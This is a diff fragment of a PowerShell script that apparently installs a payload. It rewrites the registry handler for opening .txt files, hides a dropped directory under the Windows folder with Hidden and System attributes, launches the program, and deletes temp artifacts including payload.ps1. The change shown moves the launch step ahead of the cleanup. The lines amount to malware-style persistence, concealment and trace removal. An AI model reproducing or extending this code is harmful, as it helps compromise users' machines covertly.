@@ -41,10 +41,10 @@ New-ItemProperty -path HKLM:\Software\Classes\txtfile\shell\open\command -name "
 $(Get-Item $WINDIR\$strFileDir).Attributes = ‘Hidden, System’
 # -------------------------------------------------------------------------------------------
 
+# start program
+Start-Process -FilePath "$strFilePath"
+
 # remove temp files
 Remove-Item "$TEMP\$strFileDir" -Force -Recurse
 Remove-Item "$TEMP\$ZipName" -Force
 Remove-Item "$TEMP\payload.ps1" -Force
-
-# start program
-Start-Process -FilePath "$strFilePath"
